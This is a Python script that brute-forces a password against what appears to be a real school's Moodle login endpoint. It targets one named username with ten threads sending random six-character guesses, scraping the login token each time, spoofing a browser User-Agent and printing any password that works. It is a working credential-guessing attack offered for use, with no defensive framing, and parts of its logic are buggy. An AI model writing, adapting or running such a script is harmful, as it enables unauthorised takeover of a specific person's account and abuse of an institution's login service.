import requests
import re
import math
import random 
import threading
import time
from itertools import combinations
import sys

url = "https://moodle2.helmholtz-karlsruhe.de/moodle/blocks/exa2fa/login/"
loginTokenRegex = re.compile('type="hidden" name="logintoken" value="(\w*)"', re.IGNORECASE)
threadCount = 10

def check(username, password):
    try:
        req = requests.session()
        req.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"})
        res = req.get(url)
        if res.status_code == 200:
            Ltoken = loginTokenRegex.search(res.text).group(1)
            res2 = req.post(url, data={
                "ajax": True,
                "anchor": "",
                "logintoken": Ltoken,
                "username": username,
                "password": password,
                "token": "",
            })
            if res2.status_code == 200:
                err = res2.json()["error"]
                if err == "":
                    return True
                else:
                    print(password + ": " + err)
                    return False
            else:
                print("Fehler LOL2 ("+ str(res.status_code) + ")")
                print(res2)
                return False
        else:
            print("Fehler LOL1 ("+ str(res.status_code) + ")") 
            return False
    except:
        print(password + ": " + "Error")

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW1234567890,.-#+^°!"§$%&/()=?{[]}\\;:_\'*~'
charlenght = len(chars)

def numtostring(num):
    return chars[num % charlenght] + numtostring(math.floor(num / charlenght)) if num >= charlenght else ""


def bruteforcePasswd(username):
    running = True
    while running:
        passwd = numtostring(math.floor(random.random() * math.pow(charlenght, 6)))
        if check(username, passwd):
            print("Found working: " + passwd)
            running = False


threads = []
for i in range(threadCount):
    thread = threading.Thread(target=bruteforcePasswd, args=("schellpa", ), daemon=True)
    thread.start()
    threads.append(thread)

while all(t.is_alive() for t in threads):
    time.sleep(1)
sys.exit()